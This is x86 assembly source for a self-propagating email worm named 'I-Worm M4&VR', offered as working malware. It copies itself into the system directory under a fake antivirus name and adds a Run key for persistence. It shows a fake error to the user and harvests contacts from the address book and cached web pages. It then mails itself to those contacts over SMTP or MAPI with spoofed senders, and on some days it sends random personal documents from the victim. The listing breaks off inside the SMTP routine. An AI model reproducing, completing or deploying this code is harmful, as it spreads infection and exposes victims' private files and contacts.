;-----------------------------------------------------------------------------
;-------------------------------     -----------------------------------------
;-----------------------------         ---------------------------------------
;--------------------------- I-Worm M4&VR ------------------------------------
;-----------------------------         ---------------------------------------
;-------------------------------     -----------------------------------------
;-----------------------------------------------------------------------------

.386p
.model flat

;--------------------------- Include Zone ------------------------------------

MEM_COMMIT		    		equ	00001000h
MEM_RESERVE		    		equ	00002000h
PAGE_READWRITE		    	equ	00000004h
PAGE_READONLY		    	equ	00000002h
FILE_ATTRIBUTE_NORMAL	    	equ	080h
OPEN_EXISTING		    	equ	03h
FILE_SHARE_READ		    	equ	01h
GENERIC_READ	 	    	equ	80000000h
FILE_MAP_WRITE		    	equ	00000002h
FILE_MAP_READ		    	equ	00000004h
CREATE_ALWAYS	            equ	2
GENERIC_WRITE	            equ	40000000h

;-------------------------- Macro Zone ---------------------------------------

@INIT_SehFrame  	macro	Instruction
	local   	OurSeh
      call    	OurSeh
      mov     	esp,[esp+08h]
      Instruction
OurSeh:
      xor     	edx,edx
      push    	dword ptr fs:[edx]
      mov     	dword ptr fs:[edx],esp
                	endm

@REM_SehFrame   	macro
      xor     	edx,edx
      pop     	dword ptr fs:[edx]
      pop     	edx
                	endm

@pushsz         	macro	string
      local   	Str
      call    	Str
      db      	string,0
Str:            	endm

api 			macro a
	extrn   	a:PROC
	call    	a
			endm

;------------------------ Constantes Zone ------------------------------------
       
SEH             	equ	1                    		; SEH protection

NbEmailWanted   	equ   150                        	; Nb Email to Seek >1 
EmailSize       	equ   64                         	; Attention rol eax,6 (2^6)
EmailFileSize   	equ   (EmailSize*(NbEmailWanted+1)) ; For VirtualAlloc (+Security)    
NbToSend        	equ   20                         	; Send x emails per session

NbPersoWanted	equ	20			   		; Nb Personal document to Seek
PersoSize		equ	256			   		; Attention rol eax,8 (2^8)
PersoFileSize	equ	(PersoSize*(NbPersoWanted+1)) ; For VirtualAlloc (+Security)

MimeHeaderSize	equ	1024					; Mime Header size

;-----------------------------------------------------------------------------
;--------------------------- Code Zone ---------------------------------------
;-----------------------------------------------------------------------------

.code

Mv:
    	pushad
               
      IF      	SEH
      @INIT_SehFrame <jmp ExitMv>             		; Init SEH      
      ENDIF
        
;------------------------- Check & Mark Presency -----------------------------

TryToOpenOurMutex:
      xor 		eax, eax
    	@pushsz	'MvMutex'                       	; Mutex Name                               
      push    	eax
      push    	eax
      api     	OpenMutexA                      	; already in mem
      or      	eax,eax
      jnz     	ExitMv                          	; Yes, do nothing more 
                  
CreateOurMutex:
      xor     	eax, eax
      @pushsz 	'MvMutex'                       	; Mutex Name                               
      push    	eax                             	; No owner
      push    	eax                             	; default security attrib
      api     	CreateMutexA                    	; create Our Mutex
      mov     	dword ptr[MutexHdl], eax

;---------------------------- Random Init ------------------------------------

RandomInit:
      api     	GetTickCount
      mov     	RandomNb, eax
 
;---------------------- Hide Process on Win9x --------------------------------
        
HideProcess:                                    
	@pushsz 	"KERNEL32.dll"
	api     	GetModuleHandleA
	@pushsz 	"RegisterServiceProcess"		; Error on NT
	push    	eax
	api     	GetProcAddress
	test    	eax, eax
	jz      	GetOurPathName
	push    	01h
	push    	00h
	call    	eax       
       
;----------------------- Copy Worm in Sys Dir --------------------------------

GetOurPathName:
      xor     	eax, eax
      push    	eax
	api     	GetModuleHandleA                	; Our Handle	  
      push    	260
	push    	offset MyPath
	push    	eax
	api     	GetModuleFileNameA              	; Our Path       
        
CreateDestPath:
      push    	260
	push    	offset TempPath&Name
	api     	GetSystemDirectoryA             	; System Dir

      @pushsz 	'\NETAV.EXE'
	push    	offset TempPath&Name
      api     	lstrcat                         	; Path+Name of File to Create   

CheckHowExecuted:
      push    	offset MyPath
      push    	offset TempPath&Name
      api     	lstrcmp
      test    	eax, eax
      jz      	AutoRun

CreateOurFile:
      xor     	eax, eax
      push    	eax                             	; Overwrite mode set
      push    	offset TempPath&Name            	
      push    	offset MyPath
      api     	CopyFileA                       	; Copy Worm in Sys Dir

        
;------------------------- Registry Worm -------------------------------------

RegWorm:
      push    	offset TempPath&Name
      api     	lstrlen          
	push    	eax
	push    	offset TempPath&Name
	push    	1
	@pushsz 	"NETAV Agent"
	@pushsz 	"Software\Microsoft\Windows\CurrentVersion\Run"
	push    	80000002h
	api     	SHSetValueA

;-------------------- First Launch Fake Message ------------------------------

FakeMessage:
 	push    	1040                         
      @pushsz 	'Setup'
      @pushsz 	'This file does not work on this system'
      push    	0
      api     	MessageBoxA

;---------------------- Check Email File & Create ----------------------------
AutoRun:

CheckEmailFile:
      call    	Clear_TempPath&Name        

      push    	260
      push    	offset TempPath&Name
	api     	GetSystemDirectoryA             	; System Dir
        
      push    	offset TempPath&Name
      api     	SetCurrentDirectoryA            	; Set sys dir

      push    	offset search                   	; Push it
      @pushsz 	'ICMAIL.DLL'                    	; Mask
      api     	FindFirstFileA                  	; find file    
      inc     	eax
      jnz     	UpDateEmailList                 	; The File Exist       
        
      call    	CreateEmailFile                 	; Create It if Does not exist

;----------------------- Check if Update Time --------------------------------

UpDateEmailList:
      lea     	esi,SystemTimeData
      push    	esi
      api     	GetSystemTime
        
      movzx   	edx, word ptr[esi+4]            	; Esi point day of week
      cmp     	edx, 4                          	; Jeudi ?
      jne     	Check_if_Connected              	; No

      call    	CreateEmailFile                 	; Yes, Update Email File

;-------------------------- Spread the Worm ----------------------------------
     
Check_if_Connected:
      push    	offset SystemTimeData
      api     	GetSystemTime

      push    	0
      push    	offset IConnectedStateTemp
      api		InternetGetConnectedState
      dec     	eax
      jnz    	No_internet                     	; No connection

      call    	SendEmail                       	; Send Wab Emails + Rnd Email
      jmp     	ExitMvMutex                     	; Then Bye

No_internet:
      push    	5*60*1000                         	; 5 min
      api     	Sleep
      jmp     	Check_if_Connected
              
;----------------------------- The End ---------------------------------------

ExitMvMutex:
      push    	dword ptr[MutexHdl]
      api     	CloseHandle

ExitMv:
	call		FreeTheMem

      IF      	SEH
      @REM_SehFrame                           		; Restore SEH
      ENDIF
         
      popad
                
      push    	0
      api     	ExitProcess                     	; Quit


	db		'---iworm.mv4&vr.by.tony/mvcrew---',0dh,0dh


;-----------------------------------------------------------------------------
;-----------------------------------------------------------------------------
;------------------------- Sub Routine Zone ----------------------------------
;-----------------------------------------------------------------------------
;-----------------------------------------------------------------------------


;:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
;........................ Major Sub Routine ..................................
;............................ Z O N E ........................................
;:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::


;...................... Create The Email File ................................
;.............................................................................

; OUT : Email File in System Dir : ICMAIL.DLL

CreateEmailFile:
	mov		dword ptr[NbEmailFound], 0

ReserveMem_For_EmailListe:
      xor     	eax,eax
      push    	PAGE_READWRITE                  	; read/write page
	push    	MEM_RESERVE or MEM_COMMIT
	push    	EmailFileSize
	push    	eax                             	; System decide where 
	api     	VirtualAlloc
	or      	eax,eax
	jz      	EmailFileError                  	; Alloc Fail 
      mov     	dword ptr[EmailList], eax

EmailSeeker:
      call    	SearchWabFile_Email             	; Search Email address book
      call    	SearchHtmFile_Email             	; Search Email HTML

CreateTheEmailFile:
      call    	Clear_TempPath&Name
            
      push    	260
	push    	offset TempPath&Name
	api     	GetSystemDirectoryA             	; System Dir
      @pushsz 	'\ICMAIL.DLL'
	push    	offset TempPath&Name
      api     	lstrcat                         	; Path+Name of File to Create                          
      xor     	eax,eax
      push    	eax
      push    	eax
      push    	CREATE_ALWAYS
      push    	eax
      push    	FILE_SHARE_READ 
      push    	GENERIC_WRITE        
      push    	offset TempPath&Name
      api     	CreateFileA
      inc     	eax
      jz      	EmailFileError
      dec     	eax
      mov     	[TempFileHandle], eax
        
      push    	0
      push    	offset ByteWritten
      push    	EmailFileSize                 	; Copy Listes d'Emails
      push    	dword ptr [EmailList]
      push    	[TempFileHandle]
      api     	WriteFile

      push    	dword ptr [TempFileHandle]
      api     	CloseHandle        
        
EmailFileError:
      ret


;........................ Find Email in HTML .................................
;.............................................................................

; Recursive Search from Internet Path for Email in Html

SearchHtmFile_Email:
      call    	Clear_TempPath&Name     
        
	push    	00h
	push    	20h						; Internet Path      
	push    	offset TempPath&Name
	push    	00h
	api		SHGetSpecialFolderPathA

	push    	offset TempPath&Name
	api     	SetCurrentDirectoryA			; Selected dir = Internet Path

	lea		eax, SeekHtmlCurrentDir
	mov		dword ptr[RoutineToCall], eax
	call    	AllSubDirSearch				; Action = SeekHtmlCurrentDir
	ret	  

;.............. Seek Html in Current Dir

; IN:			Selected Current dir
; OUT:  		Emails in reserved Mem
        
SeekHtmlCurrentDir:
      cmp     	dword ptr[NbEmailFound], NbEmailWanted 	; ENOUGH EMAILS FOUND !
      je      	HtmlEmailSearchEnd                     	; YES...

      lea     	edi, search
      push    	edi
	@pushsz 	'*.*htm*'
	api     	FindFirstFileA		
	inc		eax
	jne		SeekEmail_Html
	ret

SeekEmail_Html:	
      dec		eax
	xchg    	eax,esi

SeekEmail_Html_Loop:

      call    	SeekEmail_In_ThisHtml		       	; Parse Html 4 emails
        
      cmp     	dword ptr[NbEmailFound], NbEmailWanted 	; ENOUGH EMAILS FOUND !
      je      	HtmlEmailSearchFin                     	; YES...
      					
	push    	edi				
	push    	esi
	api     	FindNextFileA				
	dec     	eax
	je      	SeekEmail_Html_Loop

HtmlEmailSearchFin:
	push    	esi
	api     	FindClose				
HtmlEmailSearchEnd:	
      ret

;.............. Parse Html for emails

SeekEmail_In_ThisHtml:
	pushad
	push    	0
	push    	FILE_ATTRIBUTE_NORMAL
	push    	OPEN_EXISTING
	push    	0
	push    	FILE_SHARE_READ
	push    	GENERIC_READ
      lea     	eax, [search.FileName]
	push    	eax
	api     	CreateFileA				
	inc     	eax
	je		HtmlEmailSearchEnd            	; Only ret for the call
	dec		eax                             	; Not the total end 
	xchg    	eax,ebx

	xor		eax,eax
	push    	eax
	push    	eax
	push    	eax
	push    	PAGE_READONLY
	push    	eax
	push    	ebx
	api     	CreateFileMappingA			
	test    	eax,eax
	je		CloseHtmlHandle
	xchg    	eax,ebp

	xor		eax,eax
	push    	eax
	push    	eax
	push    	eax
	push    	FILE_MAP_READ
	push    	ebp
	api     	MapViewOfFile				
	test    	eax,eax
	je		CloseHtml_MapHandle
	xchg    	eax,esi
      mov     	[maphandlemail],esi
      mov     	[esi_save],esi

	push    	0
	push    	ebx
	api     	GetFileSize				
	xchg    	eax,ecx
	jecxz   	CloseHtml_MapViewHandle
      inc     	ecx
      jz      	CloseHtml_MapViewHandle         	; GetFileSize Error ?
      dec     	ecx
FixBugOverflow:
      sub     	ecx, 8
      cmp     	ecx, 0
      jl      	CloseHtml_MapViewHandle

SeekMailToStr:
      mov     	esi,[esi_save]        
	call    	MTStr
	db		'mailto:'
MTStr: 
	pop		edi

ScanFor_MailTo:
	pushad
	push    	7
	pop		ecx
	rep		cmpsb						; search for "mailto:"
	popad								; string
	je		MailToFound_CheckEmail		      ; check the mail address
	inc		esi
      dec     	ecx
	jnz     	ScanFor_MailTo		

CloseHtml_MapViewHandle:
	push    	[maphandlemail]
	api     	UnmapViewOfFile		
CloseHtml_MapHandle:
	push    	ebp
	api     	CloseHandle				
CloseHtmlHandle:
	push    	ebx
	api     	CloseHandle				
	popad
	ret

MailToFound_CheckEmail:
      inc     	esi
      mov     	[esi_save],esi
      dec     	esi

	mov		edi, dword ptr [EmailList]      	   
      mov     	edx, dword ptr [NbEmailFound]
      rol     	edx, 6                          	; 64 = email size stockage
      add     	edi, edx                        	; goto next place
        
      mov     	[EmailCurrentPos], edi
        
	xor		edx,edx
	add		esi,7
	push    	edi						; mail address

NextChar:	
      lodsb
	cmp		al, ' '
	je		SkipChar

	cmp		al, '"'                        	; eMail End ?
	je		EndChar
      cmp     	al, '?'                        	; eMail End ?
      je      	EndChar    
      cmp     	al, '>'                        	; eMail End ?
      je      	EndChar      
      cmp     	al, '<'                        	; eMail End ?
      je      	EndChar      
      cmp     	al, ']'                        	; eMail End ?
      je      	EndChar              
	cmp		al, ''''                       	; eMail End ?
	je		EndChar

	cmp		al, '@'                        	; Valid email ?
	jne		CopyChar
	inc		edx
CopyChar:	  
      stosb
	jmp		NextChar
SkipChar:
	inc		esi
	jmp		NextChar
EndChar:	
      xor		al,al
	stosb
	pop		edi
	test    	edx,edx					; if EDX=0, mail is not
	je		SeekMailToStr				; valid (no '@')
      
      cmp     	dword ptr [NbEmailFound], 0
      je      	NoEmailYet
       
      mov     	edi, [EmailCurrentPos]
      mov     	eax, [edi]
      sub     	edi, 64
      cmp     	eax, [edi]
      je      	SeekMailToStr
        
NoEmailYet:     
      inc     	dword ptr [NbEmailFound]       
      cmp     	dword ptr[NbEmailFound], NbEmailWanted 	; ENOUGH EMAILS FOUND !
      je      	CloseHtml_MapViewHandle                	; YES...        
        
	jmp		SeekMailToStr			       	; get next email address


;........................ Find Email in WAB ..................................
;.............................................................................

SearchWabFile_Email:
      call    	Clear_TempPath&Name

GetWabPath:       
      mov     	dword ptr[KeySize], 260         	; Init Size to get
        
	push    	offset KeySize
	push    	offset TempPath&Name
	push    	offset Reg
	push    	0  
	@pushsz 	"Software\Microsoft\Wab\WAB4\Wab File Name"
	push    	80000001h
	api		SHGetValueA
      test    	eax, eax
      jne     	EndWab

Open&Map_WabFile:
	call		Open&MapFile
	jc		EndWab
        
WabSearchEmail:
      mov     	ecx, [eax+64h]                  	; Nb of address
      jecxz   	WabUnmapView                    	; No address
      mov     	dword ptr[NbEmailFound], ecx    	; For the Html search
      mov     	[NbWabEmail],ecx                	; For the emailfile
TruncFriend:        
      cmp     	ecx, NbEmailWanted              	; Too many Friend
      jbe     	NotManyFriend
      mov     	ecx, NbEmailWanted              	; To many @, reduce it
      dec     	ecx                             	; for Html search (inc [NbEmailFound]!)
      mov     	dword ptr[NbEmailFound], ecx    	; For the Html search
      mov     	[NbWabEmail],ecx                	; For the emailfile                
NotManyFriend:        
      mov     	esi, [eax+60h]                  	; email @ array
      add     	esi, eax                        	; normalise
      mov     	edi, dword ptr[EmailList]       	; where store email

GetWabEmailLoop:
      call    	StockWabEmail
      dec     	ecx
      jnz     	GetWabEmailLoop

WabUnmapView:        
	call		Open&MapFileUnmapView

EndWab:
      ret

StockWabEmail:        
      push    	ecx esi   
      push    	40h
      pop     	ecx
      cmp     	byte ptr [esi+1],0
      jne     	StockWabEmailLoop
        
StockWabEmailUnicodeLoop:
      lodsw                                   		; Unicode
      stosb                                   		; Ansi
      dec     	ecx
      test    	al, al
      jne     	StockWabEmailUnicodeLoop
      add     	edi, ecx                        	; next email field in Dest
      pop     	esi ecx
      add     	esi, 44h                        	; next email field in Wab
      ret

StockWabEmailLoop:
      movsb                                   		; Ansi
      dec     	ecx
      test    	al, al
      jne     	StockWabEmailLoop
      add     	edi, ecx                        	; next email field in Dest
      pop     	esi ecx
      add     	esi, 24h                        	; next email field in Wab
      ret

;..................... Send Email SMTP or MAPI ...............................
;.............................................................................

; OUT:  Send via SMTP or MAPI #NbToSend Ramdom EmailAddress from EmailFile


SendEmail:
	call		MapEmailFile				; Map The Email File
	jnc		HowToSend
	ret
	
HowToSend:
      mov     	byte ptr[SmtpFlag], 0    		; init flag to 0     
      call    	GetUserSmtpServer				; Default Smtp Serveur Found ?
      jc      	MapiSendVersion    			; No
      not     	byte ptr[SmtpFlag]       		; flag = 1

MapiSendVersion:
      not     	byte ptr[SmtpFlag]       		; flag=0 if SMTP, flag=1 -> MAPI    

MapEmailFileOk:
      lea     	esi, SystemTimeData              
      movzx   	ecx, word ptr[esi+4]            	; Esi point day of week
	cmp		ecx, 2					; Mardi
	jne		_NormalSend
	mov		byte ptr[PayloadFlag], 1
	call		PersonalDocSearch				; Personal doc path in mem

_NormalSend:
	call		NormalSendInit				; init attachement 4 Normal Send
    
      mov     	ebx, NbToSend                   	; Send NbToSend emails per session
SendRandomEmailLoop:
      call    	SelectEmail                     	; return email ads in esi
	jecxz   	SendBye					; EmailFile empty or NonExploitable

      lea     	edi, CurrentEmail               	; <-----------------
      mov     	ecx, EmailSize                  	;                   |
      rep     	movsb                           	; Copy rnd Email in |

	xor		al, al
	sub     	esi, EmailSize
	xchg    	edi, esi
      mov     	ecx, EmailSize
	rep		stosb						; Remove email sent in EmailFile

PaySendTime:
	cmp		byte ptr[PayloadFlag], 0
	je		NormalSend
	call		PayloadSendInit				; Personals doc name in MyPath
	
NormalSend:       
	call		BuildMessageHeader			; build the mime header

      cmp     	byte ptr[SmtpFlag], 0
      jne     	MapiSendIt                      	; flag=1 -> MAPI

      call    	SmtpConnection
      jc      	MapiSendIt					; smtp error -> mapi send
      call    	SmtpSendCommand
      jc      	MapiSendIt					; smtp error -> mapi send
	call    	SmtpDisConnection
	jmp		SendNext					; If here No Mapi Needed

MapiSendIt:
      call    	MapiSend

SendNext:        
	cmp		byte ptr[PayloadFlag], 0
	je		NormalSendNext
	call		ReleasePayMem
NormalSendNext:
	call		ClearHeaderMem
      dec     	ebx
      jnz     	SendRandomEmailLoop             	; Send #NbToSend emails

SendBye:        
	jmp		Open&MapFileUnmapView			; Clean De-map EmailFile


;.............. Select Email to Send 

; OUT:  		esi point on the email   
;       		ecx = 0 if error
;       		select first the email from the *.WAB

SelectEmail:
	mov		ecx, NbEmailWanted
	inc		ecx
SelectIT:
	dec		ecx
	jz		SelectEmailError		

      mov     	esi, dword ptr [mapaddress]     	; emails from file in memory

	mov		edi, NbEmailWanted			; Rnd Range
      call    	GetRndNumber                    	; Rnd Nb in edx

      cmp     	dword ptr[NbWabEmail], 0
      je      	TriEMails
        
	dec		dword ptr[NbWabEmail]
	mov		edx, dword ptr[NbWabEmail]

TriEMails:      
      rol     	edx, 6                          	; edx*emailsize (64)        
      add     	esi, edx                        	; esi on the email
  
      mov     	eax, dword ptr [esi]
      test    	eax, eax                        	; No empty email
      je      	SelectIT
      mov     	eax, dword ptr [esi]
      or      	eax, 20202020h                  	; Lower case
      cmp     	eax, 'mbew'                     	; No webmaster@xxxxxxxx
      je      	SelectIT
      mov     	eax, dword ptr [esi]
      or      	eax, 20202020h                  	; Lower case
      cmp     	eax, 'ptth'                     	; No http:\\xxxxxxxxxxx
      je      	SelectIT
SelectEmailError:	  
      ret

;.............. Normal Init The Attachement File 

; Routine appelée tout le temps (Payload ou pas) -> Init du mess: header + body

NormalSendInit:

InitWhoSendName:
	call		ResMemHeader				; Some Mem for the mime header

      mov     	dword ptr[KeySize], 00000040h   	; Init Size to get

	push   	offset KeySize
	push    	offset mailfrom
	push    	offset Reg
      @pushsz 	"SMTP Email Address"          	; User mail (for mail from:)
      lea     	eax, AccountKey
      push    	eax
	push    	80000001h
	api     	SHGetValueA
	test		eax, eax
	je		InitWormName
	mov		byte ptr[UserEmailFoundFlag], 1

InitWormName:
      xor     	al,al
      mov     	ecx,260
      lea     	edi, MyPath  
      rep     	stosb
        
      push    	260
	push    	offset MyPath
	api     	GetSystemDirectoryA             	; System Dir

      @pushsz 	'\NETAV.EXE'
	push    	offset MyPath
      api     	lstrcat                         	; Path+Name 4 Mapi Send&Smtp CodeB64File  

SmtpNormalSendInit:	
	call		CodeB64File  				; return worm file encoded in mem

	ret

;.............. Build Message Header

BuildMessageHeader:
	push		ebx						; for the loop

	cmp		byte ptr[UserEmailFoundFlag], 0
	je		BuildHeader	

CreateNameFrom:
	xor		al, al
	lea		edi, mailfrom
	mov		ecx, EmailSize
	rep		stosb

	push		NbFromName					; nb name
	pop		edi
	call		GetRndNumber				; edx = rnd nb
	
	lea		edi, RndFromNameTb
	rol		edx, 2					; table de dd
	add		edi, edx					; Point the right Name offset
	mov		edi, [edi]
	
	push 		edi						; User mail not found -> fix another name
	push		offset mailfrom
	api		lstrcat

CreateServFrom:
	push		NbFromServ					; nb serv
	pop		edi
	call		GetRndNumber				; edx = rnd nb
	
	lea		edi, RndFromServTb
	rol		edx, 2					; table de dd
	add		edi, edx					; Point the right Serv offset
	mov		edi, [edi]
	
	push 		edi						; User mail not found -> fix another name
	push		offset mailfrom
	api		lstrcat

BuildHeader:
	mov		esi, dword ptr[MemMessageBody1]	; some mem

BuildFrom:
      @pushsz 	'From: '					; From: 
	push    	esi
      api     	lstrcat                          

	push		offset mailfrom				; user mail or another fixed
	push		esi
	api		lstrcat

	@pushsz	CRLF
	push		esi
	api		lstrcat

BuildTo:
	@pushsz	'To: '					; To:
	push		esi
	api		lstrcat
	
	push		offset CurrentEmail			; Email found in *.wab or Html
	push		esi
	api		lstrcat
	
	@pushsz	CRLF
	push		esi
	api		lstrcat
	
BuildSubject:
	@pushsz	'Subject: '					; Subject:
	push		esi
	api		lstrcat
	
	push		NbSubject					; nb Subject
	pop		edi
	call		GetRndNumber				; edx = rnd nb
	
	lea		edi, RndSubjectTb
	rol		edx, 2					; table de dd
	add		edi, edx					; Point the right Subject offset
	mov		edi, [edi]

	push 		edi						; Rnd Subject
	push		esi
	api		lstrcat
	
	@pushsz	CRLF
	push		esi
	api		lstrcat

BuildBody:
	push 		offset MessageBody1			; Mime bordel jusqu'a -> email message
	push		esi
	api		lstrcat

BuiltEmailMessage:
	push		NbRndText					; nb Text
	pop		edi
	call		GetRndNumber				; edx = rnd nb
	
	lea		edi, RndTextTb
	rol		edx, 2					; table de dd
	add		edi, edx					; Point the right Text offset
	mov		edi, [edi]

	push 		edi						; Rnd Text
	push		esi
	api		lstrcat

BuildBody1b:
	push 		offset MessageBody1b			; email message -> name=
	push		esi
	api		lstrcat

	cmp		byte ptr[PayloadFlag],0
	jne		BuildFileNamePay

BuildFileNameNormal:
	push		NbRndFileName				; nb FileName
	pop		edi
	call		GetRndNumber				; edx = rnd nb
	
	lea		edi, RndFileNameTb
	rol		edx, 2					; table de dd
	add		edi, edx					; Point the right Text offset
	mov		edi, [edi]
	
	push 		edi						; Rnd File in name=
	push		esi
	api		lstrcat

	@pushsz	CRLF
	push		esi
	api		lstrcat

	push 		offset MessageBody1c			; .EXE",CRLF -> filename=
	push		esi
	api		lstrcat

	push 		edi						; Rnd File in filename=
	push		esi
	api		lstrcat

	@pushsz	CRLF
	push		esi
	api		lstrcat
	@pushsz	CRLF
	push		esi
	api		lstrcat

	jmp		BuildSizeBody1

BuildFileNamePay:
	call		Clear_TempPath&Name

	push		260
	push		offset TempPath&Name
	push		offset MyPath
	api		GetFileTitleA

	@pushsz	'"'
	push		esi
	api		lstrcat

	push		offset TempPath&Name
	push		esi
	api		lstrcat

	@pushsz	'"'
	push		esi
	api		lstrcat

	@pushsz	CRLF
	push		esi
	api		lstrcat

	push 		offset MessageBody1c			; .EXE",CRLF -> filename=
	push		esi
	api		lstrcat

	@pushsz	'"'
	push		esi
	api		lstrcat

	push		offset TempPath&Name
	push		esi
	api		lstrcat

	@pushsz	'"'
	push		esi
	api		lstrcat

	@pushsz	CRLF
	push		esi
	api		lstrcat
	@pushsz	CRLF
	push		esi
	api		lstrcat

BuildSizeBody1:
	push		esi	
	api		lstrlen

	mov		dword ptr[MessageSize1], eax		; Header+Mime bordel lenght for send cmd

BuildMessageHeaderError:
	pop		ebx						; for the loop
	ret

;.............. Payload Init The Attachement File

PayloadSendInit:
	push		ebx						; For The send Loop

	mov		edi, dword ptr[NbPersonalFound]	; Rnd Range
      call    	GetRndNumber                    	; Rnd Nb in edx

PayMapiSendInit:
      xor     	al,al
      mov     	ecx,260
      lea     	edi, MyPath                
      rep     	stosb

	mov		esi, dword ptr [PersoDocListe]
	rol		edx, 8
	add		esi, edx					; esi = perso doc path
	lea		edi, MyPath
	mov		ecx, 256					; Perso path size
	rep		movsb

PaySmtpSendInit:
	call		CodeB64File					; return perso file encoded in mem
	
	pop		ebx						; For The send Loop	
      ret               

;.............. Some Mem For The Mime Header

ReleasePayMem:
	push		ebx

	mov		ecx, dword ptr [MemEncoded]
	call		MemFreeIt
	mov		ecx, dword ptr [MemToEncode]
	call		MemFreeIt

	pop		ebx
	ret

ClearHeaderMem:
      xor     	al,al
      mov     	ecx, MimeHeaderSize
	mov		edi, dword ptr[MemMessageBody1]
      rep     	stosb
	ret

;.............. Some Mem For The Mime Header

ResMemHeader:
      xor     	eax,eax
      push    	PAGE_READWRITE                  	; read/write page
	push    	MEM_RESERVE or MEM_COMMIT
	push    	MimeHeaderSize
	push    	eax                             	; System decide where 
	api     	VirtualAlloc
	mov		dword ptr[MemMessageBody1], eax
	ret
   
;.............. Map The Email File

;OUT:			eax = mapaddress
;			cf  = 0	if no error

MapEmailFile:
      call    	Clear_TempPath&Name 
        
      push    	260
	push    	offset TempPath&Name
	api     	GetSystemDirectoryA
      @pushsz 	'\ICMAIL.DLL'
	push    	offset TempPath&Name
      api     	lstrcat                         	; Path+Name                  
   
	call		Open&MapFile
     	ret


;.......................... Send Via MAPI ....................................
;.............................................................................


MapiSend:
	push		ebx						; For The send Loop

      xor     	eax, eax
      push    	eax
      push    	eax
      push    	offset MapiMessage
      push    	eax
      push    	dword ptr [MAPISession]
      api     	MAPISendMail

	pop		ebx						; For The send Loop
      ret


;........................... Send via SMTP ...................................
;.............................................................................

; 4 Part: 
;         		- GetLocalSmtpServeur: Find default SMTP server
;         		- SmtpConnection:      Init Socket + Connect to Smpt host
;         		- SmtpSendCommand:     Send all the commands
;         		- SmtpDisConnection:   Clean + Disconnect


;.............. Get User Server

GetUserSmtpServer:

GetUserInternetAccount:
      mov     	dword ptr[KeySize], 00000040h   	; Init Size to get
         
	push    	offset KeySize
	push    	offset AccountSubKey
	push    	offset Reg
	@pushsz 	"Default Mail Account"
	@pushsz 	"Software\Microsoft\Internet Account Manager"
	push    	80000001h
	api     	SHGetValueA
      test    	eax, eax
      jne     	GetUserSmtpServerError

GetUserInternetServer:
      mov     	dword ptr[KeySize], 00000040h   	; Init Size to get

	push    	offset KeySize
	push    	offset SmtpServeur
	push    	offset Reg
	@pushsz 	"SMTP Server"
      lea     	eax, AccountKey
      push    	eax
	push    	80000001h
	api     	SHGetValueA
      test    	eax, eax
      jne     	GetUserSmtpServerError        
      clc
      ret       
GetUserSmtpServerError:
      stc
      ret

;.............. Smtp Connection
                                                
SmtpConnection:
	pushad
	push    	offset WSAData                  	; Struct WSA
	push    	101h                        		; VERSION1_1
	api     	WSAStartup					; Socket Init
	test    	eax,eax                         	; ok ?
	jne		WSA_Error                       	; No, exit with stc 

	push    	0                               	; Protocol = 0 (more sure)
	push    	1                               	; SOCK_STREAM
	push    	2                               	; AF_INET (most used)
	api     	socket					; create socket
	inc		eax                             	; -1 = error
	je		Socket_Error                    	; WSACleanUp and stc
	dec		eax
	mov		[hSocket],eax                   	; Socket Handle

	push		25						; Smtp port
	api		htons						; Convert it
	mov		word ptr[wsocket+2], ax			; The port ( 2 ptr[wsocket]=AF_INET )

	push    	offset SmtpServeur              	; The SMPT Host
	api     	gethostbyname				; SMPT to IP
	test    	eax,eax                         	; error ?
	je		Error_CloseSocket&CleanUp       	; Exit + stc                
	mov		eax,[eax+10h]                   	; get ptr 2 IP into HOSTENT
	mov		eax,[eax]                       	; get ptr 2 IP
	mov		[ServeurIP],eax				; Save it

	push    	010h		          			; size of sockaddr struct
	push    	offset wsocket                  	; Ptr on it
	push    	[hSocket]                       	; Handle
	api     	connect					; connect to smtp server
	inc		eax
	je		Error_CloseSocket&CleanUp       	; Exit + stc
	call    	GetServeurReply				; get server response
	jc		Error_CloseSocket&CleanUp       	; If c=0 Connection OK !
	popad
	clc
	ret

GetServeurReply:
	push    	0                               	; Flags
	push    	4                               	; Get a LongWord
	push    	offset ServeurReply             	; in ServeurReply
	push    	[hSocket]
	api     	recv                            	; get stmp server error code
	cmp		eax, 4                          	; Receive a LongWord  
	jne		ReplyError                      	; No, stc

ServeurReplyLoop:	
      mov		ebx, offset ServeurReplyEnd     	; Get a byte In
	push    	0                               	; Flags
	push    	1                               	; a byte
	push    	ebx
	push    	[hSocket]
	api     	recv
	jne		ReplyError

	cmp		byte ptr [ebx], 0Ah
	jne     	ServeurReplyLoop				; skip over CRLF

	mov		eax, [ServeurReply]
	cmp		eax, ' 022'					
	je		ReplyOk
	cmp		eax, ' 052'					
	je		ReplyOk
	cmp		eax, ' 152'					
	je		ReplyOk
	cmp		eax, ' 453'					
	jne		ReplyError
ReplyOk:	  
      clc
	ret
ReplyError:	
      stc
	ret

;.............. Smtp DisConnection

SmtpDisConnection:
	pushad
Error_CloseSocket&CleanUp:
	push    	dword ptr [hSocket]
	api     	closesocket
Socket_Error:
      api     	WSACleanup        
WSA_Error:	
      popad
	stc
	ret

;.............. Smtp Send

SmtpSendCommand:
	pushad

SendHelloCmd:
	mov     	esi,offset cmd_helo          		; 'HELO xxx',CRLF
	push    	14                              	; cmd size
	pop		ecx                             	; cmd size
	call    	SendSocket					; send HELO command
	call    	GetServeurReply                 	; Ok ?
	jc      	Error_CloseSocket&CleanUp       	; No

SendMailFromCmd:
	mov		esi,offset cmd_mailfrom         	; 'MAIL FROM:<'
	push    	11                              	; cmd size
	pop     	ecx                             	; size
	call    	SendSocket					; send MAIL FROM command

	mov		esi,offset mailfrom             	; ptr default user email
	push		esi
	api		lstrlen
	xchg		ecx, eax
	call    	SendSocket                        	; 2° Write xxxx@xxxx.xx

	call		Brk1
	db		'>',CRLF
Brk1:	pop		esi
	push    	3
	pop		ecx	
	call    	SendSocket					; 3° Write '>',CRLF

	call    	GetServeurReply                 	; Ok
	jc		Error_CloseSocket&CleanUp       	; No

SendRcptToCmd:
	mov		esi,offset cmd_rcptto           	; 'RCPT TO:<'
	push    	9                               	; cmd size
	pop     	ecx                             	; cmd size
	call    	SendSocket                    	; 1° Write 'RCPT TO:<'

	mov		esi,offset CurrentEmail         	; ptr email
	push		esi
	api		lstrlen
	xchg		ecx, eax
	call    	SendSocket                        	; 2° Write xxxx@xxxx.xx

	call		Brk2
	db		'>',CRLF
Brk2:	pop		esi
	push    	3
	pop		ecx	
